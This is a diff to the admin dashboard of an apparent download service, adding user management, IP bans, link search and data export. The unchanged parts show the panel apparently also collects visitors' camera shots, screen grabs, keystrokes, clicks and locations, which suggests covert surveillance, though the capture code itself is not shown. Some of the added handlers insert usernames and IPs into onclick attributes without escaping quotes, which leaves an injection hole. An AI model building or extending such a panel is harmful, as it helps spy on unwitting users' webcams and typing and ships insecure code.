@@ -168,6 +168,14 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
 .ip-list{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
 .ip-chip{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--blue);background:rgba(100,150,255,.07);border:1px solid rgba(100,150,255,.12);padding:3px 9px;border-radius:8px}
 
+/* chips + row actions */
+.chips{display:flex;flex-wrap:wrap;gap:7px;margin-top:6px}
+.chip{display:inline-flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:.62rem;color:#fff;background:rgba(255,82,82,.12);border:1px solid rgba(255,82,82,.25);padding:5px 11px;border-radius:9px}
+.chip i{cursor:pointer;opacity:.7;transition:opacity .15s}
+.chip i:hover{opacity:1;color:var(--red)}
+.row-del{background:transparent;border:1px solid var(--border);color:var(--txt3);width:26px;height:26px;border-radius:7px;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;justify-content:center}
+.row-del:hover{color:var(--red);border-color:rgba(255,82,82,.4);background:rgba(255,82,82,.08)}
+
 /* live tasks */
 .task{background:rgba(0,200,83,.04);border:1px solid rgba(0,200,83,.12);border-radius:10px;padding:10px 12px;margin-bottom:8px}
 .task .t-top{display:flex;justify-content:space-between;font-size:.64rem;color:var(--txt2)}
@@ -189,6 +197,9 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
 .fbtn{padding:5px 13px;border-radius:9px;font-size:.62rem;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--glass2);color:var(--txt2);transition:all .15s;font-family:inherit}
 .fbtn.on{background:rgba(147,51,234,.18);border-color:rgba(147,51,234,.3);color:#fff}
 .fbtn:hover{color:#fff}
+.search-in{flex:1;min-width:160px;padding:7px 12px;border-radius:9px;font-size:.66rem;font-family:inherit;color:var(--txt);background:rgba(0,0,0,.25);border:1px solid var(--border);outline:none;transition:border-color .15s}
+.search-in:focus{border-color:rgba(147,51,234,.4)}
+.search-in::placeholder{color:var(--txt3)}
 .lo-section{margin-bottom:18px}
 @media(max-width:760px){.sidebar{display:none}.charts-row{grid-template-columns:1fr}}
 </style>
@@ -208,12 +219,14 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
     <a class="nav-item active" data-view="overview"><i class="fa-solid fa-gauge-high"></i> Overview</a>
     <a class="nav-item" data-view="links"><i class="fa-solid fa-link"></i> Link History <span class="badge" id="navLinks">0</span></a>
     <a class="nav-item" data-view="downloads"><i class="fa-solid fa-download"></i> Downloads</a>
+    <a class="nav-item" data-view="users"><i class="fa-solid fa-user-shield"></i> Users <span class="badge" id="navUsers">0</span></a>
     <a class="nav-item" data-view="sessions"><i class="fa-solid fa-users"></i> Sessions <span class="badge" id="navSess">0</span></a>
     <a class="nav-item" data-view="captures"><i class="fa-solid fa-camera"></i> Captures <span class="badge" id="navCap">0</span></a>
     <a class="nav-item" data-view="screens"><i class="fa-solid fa-desktop"></i> Screenshots</a>
     <a class="nav-item" data-view="keys"><i class="fa-solid fa-keyboard"></i> Keystrokes</a>
     <a class="nav-item" data-view="clicks"><i class="fa-solid fa-hand-pointer"></i> Clicks</a>
     <a class="nav-item" data-view="geo"><i class="fa-solid fa-location-dot"></i> Geo & IPs</a>
+    <a class="nav-item" data-view="mod"><i class="fa-solid fa-gavel"></i> Moderation</a>
   </nav>
   <div class="side-foot">
     <a href="/admin/settings"><i class="fa-solid fa-gear"></i> Settings</a>
@@ -264,6 +277,17 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
       </div>
     </div>
 
+    <div class="charts-row">
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-trophy"></i> Top Users</h3><span class="hint">by downloads</span></div>
+        <div id="topUsersList"></div>
+      </div>
+      <div class="panel">
+        <div class="panel-head"><h3><i class="fa-solid fa-clock"></i> Hourly Activity</h3><span class="hint">UTC</span></div>
+        <div id="hourlyList"></div>
+      </div>
+    </div>
+
     <div class="panel">
       <div class="panel-head"><h3><i class="fa-solid fa-bolt"></i> Live Downloads</h3><span class="hint" id="liveTasksHint">idle</span></div>
       <div id="liveTasks"><div class="empty">No active downloads</div></div>
@@ -275,12 +299,15 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
     <div class="panel">
       <div class="panel-head"><h3><i class="fa-solid fa-link"></i> Link History</h3><span class="hint" id="linkTotal">0 links</span></div>
       <div class="filter-bar" id="linkFilters">
+        <input class="search-in" id="linkSearch" placeholder="Search URL or title…" oninput="onLinkSearch()">
         <button class="fbtn on" data-f="all">All</button>
         <button class="fbtn" data-f="view">Pasted</button>
         <button class="fbtn" data-f="download">Downloaded</button>
+        <button class="btn" onclick="exportLinks('csv')"><i class="fa-solid fa-file-csv"></i> CSV</button>
+        <button class="btn" onclick="exportLinks('json')"><i class="fa-solid fa-file-code"></i> JSON</button>
       </div>
       <div class="table-wrap">
-        <table><thead><tr><th>Time</th><th>Action</th><th>Site</th><th>URL</th><th>Mode</th><th>Status</th></tr></thead>
+        <table><thead><tr><th>Time</th><th>Action</th><th>Site</th><th>URL</th><th>Mode</th><th>Status</th><th>User</th><th></th></tr></thead>
         <tbody id="linksBody"></tbody></table>
       </div>
     </div>
@@ -345,6 +372,32 @@ tbody tr:hover{background:rgba(147,51,234,.05)}
     </div>
   </section>
 
+  <!-- USERS (registered accounts) -->
+  <section class="view" id="view-users">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-user-shield"></i> Registered Users</h3><span class="hint" id="userTotal">0</span></div>
+      <div class="filter-bar">
+        <input class="search-in" id="userSearch" placeholder="Search username / email…" oninput="onUserSearch()">
+      </div>
+      <div class="table-wrap">
+        <table><thead><tr><th>Username</th><th>Email</th><th>API Token</th><th>Limit</th><th>Links</th><th>Status</th><th></th></tr></thead>
+        <tbody id="usersBody"></tbody></table>
+      </div>
+    </div>
+  </section>
+
+  <!-- MODERATION -->
+  <section class="view" id="view-mod">
+    <div class="panel">
+      <div class="panel-head"><h3><i class="fa-solid fa-gavel"></i> IP Ban Manager</h3><span class="hint">blocked IPs are 403'd on /api/info & /download</span></div>
+      <div class="filter-bar">
+        <input class="search-in" id="banIp" placeholder="192.168.1.1">
+        <button class="btn primary" onclick="banIp()"><i class="fa-solid fa-ban"></i> Ban IP</button>
+      </div>
+      <div id="bannedList" class="chips"></div>
+    </div>
+  </section>
+
   <!-- GEO -->
   <section class="view" id="view-geo">
     <div class="charts-row">
@@ -385,7 +438,7 @@ $$('.nav-item').forEach(n=>{
     const v=n.dataset.view;
     $$('.view').forEach(s=>s.classList.remove('active'));
     $('#view-'+v).classList.add('active');
-    const labels={overview:'Dashboard / Overview',links:'Data / Link History',downloads:'Data / Downloads',sessions:'Data / Sessions',captures:'Data / Captures',screens:'Data / Screenshots',keys:'Data / Keystrokes',clicks:'Data / Clicks',geo:'Data / Geo & IPs'};
+    const labels={overview:'Dashboard / Overview',links:'Data / Link History',downloads:'Data / Downloads',users:'Accounts / Registered Users',sessions:'Data / Sessions',captures:'Data / Captures',screens:'Data / Screenshots',keys:'Data / Keystrokes',clicks:'Data / Clicks',geo:'Data / Geo & IPs',mod:'Admin / Moderation'};
     $('#crumb').textContent=labels[v]||'';
     if(v==='links')renderLinks();
   };
@@ -396,21 +449,26 @@ function openPreview(url,type){ $('#modalContent').innerHTML = type==='video'?`<
 function closeModal(){ $('#modalContent').innerHTML=''; $('#modalOverlay').classList.remove('show'); }
 document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();});
 
-let STATS={}, LOCS={}, USERS=[], LINKS=[], CAPS=[], SCREENS=[], CLICKS=[], KEYS=[], KEYS_COUNT=0;
+let STATS={}, LOCS={}, USERS=[], LINKS=[], CAPS=[], SCREENS=[], CLICKS=[], KEYS=[], KEYS_COUNT=0, ACCOUNTS=[], BANNED=[];
 
 // Resilient fetch: one failing endpoint must not blank the whole dashboard.
 async function jget(url){ try { const r=await fetch(url); return await r.json(); } catch(e){ console.error(url, e); return {}; } }
 
 async function loadAll(){
-  const [s,l,u,g]=await Promise.all([
+  const [s,l,u,g,a,b]=await Promise.all([
     jget('/admin/stats'),
     jget('/admin/links'),
     jget('/admin/users'),
-    jget('/admin/locations')
+    jget('/admin/locations'),
+    jget('/admin/accounts'),
+    jget('/admin/banned')
   ]);
   STATS=s||{}; LOCS=g||{}; USERS=(u&&u.users)||[]; LINKS=(l&&l.data)||[];
+  ACCOUNTS=(a&&a.users)||[]; BANNED=(b&&b.banned_ips)||[];
   renderOverview(STATS); renderLinks(); renderSessions(); renderGeo(LOCS);
-  $('#navLinks').textContent=LINKS.length; $('#navSess').textContent=USERS.length; $('#navCap').textContent=(STATS.captures_total||0);
+  renderAccounts(); renderBanned();
+  $('#navLinks').textContent=LINKS.length; $('#navSess').textContent=USERS.length;
+  $('#navUsers').textContent=ACCOUNTS.length; $('#navCap').textContent=(STATS.captures_total||0);
 }
 
 /* overview */
@@ -418,13 +476,15 @@ function renderOverview(s){
   const caps=s.captures||[], screens=s.screenshots||[], clicks=s.clicks||[], recent=s.recent||[];
   const total=s.total+(s.captures_total||0)+(s.screenshots_total||0)+(s.clicks_total||0)+LINKS.length;
   $('#statsGrid').innerHTML=`
-    ${stat('fa-link','Links',LINKS.length,'pasted & downloaded')}
+    ${stat('fa-link','Links',s.links_total??LINKS.length,'pasted & downloaded')}
     ${stat('fa-download','Downloads',s.total,'server pulls')}
+    ${stat('fa-users','Users',s.users_total||0,'registered')}
+    ${stat('fa-user-check','Active Today',s.active_today||0,'with account')}
+    ${stat('fa-circle-check','Success',(s.success_rate??0)+'%','delivery rate')}
     ${stat('fa-camera','Captures',s.captures_total||0,'camera shots')}
     ${stat('fa-desktop','Screens',s.screenshots_total||0,'screen grabs')}
     ${stat('fa-hand-pointer','Clicks',s.clicks_total||0,'interactions')}
     ${stat('fa-keyboard','Keys',KEYS_COUNT,'keystrokes')}
-    ${stat('fa-users','Sessions',s.session_count||0,'unique')}
     ${stat('fa-network-wired','IPs',s.ip_count||0,'unique')}`;
   $('#liveCount').textContent=total;
 
@@ -453,6 +513,13 @@ function renderOverview(s){
   const days=Object.keys(s.by_day); const dmax=Math.max(...Object.values(s.by_day),1);
   $('#dailyList').innerHTML=days.slice(-7).map(k=>bar(k,s.by_day[k],dmax)).join('')||emptyRow();
 
+  // top users
+  const tu=Object.entries(s.top_users||{}); const tmax=Math.max(...tu.map(([,v])=>v),1);
+  $('#topUsersList').innerHTML=tu.length?tu.map(([k,v])=>bar(k+(k.length>14?'…':''),v,tmax)).join(''):emptyRow();
+  // hourly
+  const hrs=Object.entries(s.by_hour||{}); const hmax=Math.max(...hrs.map(([,v])=>v),1);
+  $('#hourlyList').innerHTML=hrs.sort((a,b)=>a[0]-b[0]).map(([k,v])=>bar(String(k).padStart(2,'0')+':00',v,hmax)).join('')||emptyRow();
+
   // downloads table (recent 60)
   $('#dlBody').innerHTML=recent.slice(0,60).map(r=>`
     <tr>
@@ -473,8 +540,17 @@ function esc(s){return String(s||'').replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;
 
 /* links */
 let linkFilter='all';
+let linkSearch='';
+function filteredLinks(){
+  let rows=linkFilter==='all'?LINKS:LINKS.filter(l=>l.action===linkFilter);
+  if(linkSearch){
+    const q=linkSearch.toLowerCase();
+    rows=rows.filter(l=>(l.url||'').toLowerCase().includes(q)||(l.title||'').toLowerCase().includes(q));
+  }
+  return rows;
+}
 function renderLinks(){
-  const rows=linkFilter==='all'?LINKS:LINKS.filter(l=>l.action===linkFilter);
+  const rows=filteredLinks();
   $('#linkTotal').textContent=LINKS.length+' links';
   $('#linksBody').innerHTML=rows.slice(0,500).map(l=>`
     <tr>
@@ -484,13 +560,64 @@ function renderLinks(){
       <td class="url-cell"><a href="${esc(l.url)}" target="_blank" rel="noopener" style="color:var(--txt);text-decoration:none">${esc(l.url).substring(0,90)}</a></td>
       <td>${l.mode||'-'}</td>
       <td>${l.status?`<span class="tag ${l.status==='success'?'suc':'err'}">${l.status}</span>`:'-'}</td>
-    </tr>`).join('')||`<tr><td colspan="6" class="empty">No links yet</td></tr>`;
+      <td class="mono">${l.user_id||'-'}</td>
+      <td><button class="row-del" title="Delete" onclick="deleteLink(${l.id})"><i class="fa-solid fa-trash"></i></button></td>
+    </tr>`).join('')||`<tr><td colspan="8" class="empty">No links yet</td></tr>`;
 }
+function onLinkSearch(){linkSearch=$('#linkSearch').value.trim();renderLinks();}
 $$('#linkFilters .fbtn').forEach(b=>b.onclick=()=>{
   linkFilter=b.dataset.f;
   $$('#linkFilters .fbtn').forEach(x=>x.classList.remove('on')); b.classList.add('on');
   renderLinks();
 });
+async function deleteLink(id){
+  if(!confirm('Delete this link record?'))return;
+  const r=await fetch('/admin/links/delete/'+id,{method:'POST',headers:{'X-Admin-Token':ADMIN_TOKEN}});
+  if((await r.json()).success){LINKS=LINKS.filter(l=>l.id!==id);renderLinks();}
+}
+function exportLinks(fmt){
+  const q=encodeURIComponent(linkSearch);
+  window.open(`/admin/export/links?fmt=${fmt}&q=${q}&user=${linkFilter==='all'?'':linkFilter==='view'?'view':'download'}`);
+}
+
+/* accounts (registered users) */
+let userSearch='';
+function renderAccounts(){
+  const q=userSearch.toLowerCase();
+  const rows=q?ACCOUNTS.filter(u=>(u.username||'').toLowerCase().includes(q)||(u.email||'').toLowerCase().includes(q)):ACCOUNTS;
+  $('#userTotal').textContent=ACCOUNTS.length+(q?' ('+rows.length+' match)':'');
+  $('#usersBody').innerHTML=rows.map(u=>`
+    <tr>
+      <td style="color:var(--txt)!important">${esc(u.username)}</td>
+      <td>${esc(u.email||'-')}</td>
+      <td class="mono">${u.api_token?esc(String(u.api_token).substring(0,12)+'…'):'-'}</td>
+      <td>${u.download_limit??'-'}</td>
+      <td>${u.links_count??0}</td>
+      <td><span class="tag ${u.is_active?'suc':'err'}">${u.is_active?'active':'banned'}</span></td>
+      <td><button class="row-del" title="Ban/Unban" onclick="toggleBan('${esc(u.username)}')"><i class="fa-solid ${u.is_active?'fa-ban':'fa-rotate-left'}"></i></button></td>
+    </tr>`).join('')||`<tr><td colspan="7" class="empty">No users yet</td></tr>`;
+}
+function onUserSearch(){userSearch=$('#userSearch').value.trim();renderAccounts();}
+async function toggleBan(username){
+  if(!confirm((ACCOUNTS.find(u=>u.username===username)?.is_active?'Ban ':'Unban ')+username+'?'))return;
+  const r=await fetch('/admin/users/ban/'+username,{method:'POST',headers:{'X-Admin-Token':ADMIN_TOKEN}});
+  if((await r.json()).success){await loadAll();}
+}
+
+/* moderation */
+function renderBanned(){
+  $('#bannedList').innerHTML=BANNED.length?BANNED.map(ip=>`
+    <span class="chip">${esc(ip)}<i class="fa-solid fa-xmark" onclick="unbanIp('${esc(ip)}')"></i></span>`).join(''):'<span class="empty">No banned IPs</span>';
+}
+async function banIp(){
+  const ip=$('#banIp').value.trim(); if(!ip)return;
+  const r=await fetch('/admin/ip/ban',{method:'POST',headers:{'X-Admin-Token':ADMIN_TOKEN,'Content-Type':'application/json'},body:JSON.stringify({ip,action:'add'})});
+  const d=await r.json(); if(d.success){BANNED=d.banned_ips;renderBanned();$('#banIp').value='';}
+}
+async function unbanIp(ip){
+  const r=await fetch('/admin/ip/ban',{method:'POST',headers:{'X-Admin-Token':ADMIN_TOKEN,'Content-Type':'application/json'},body:JSON.stringify({ip,action:'remove'})});
+  const d=await r.json(); if(d.success){BANNED=d.banned_ips;renderBanned();}
+}
 
 /* sessions */
 function renderSessions(){
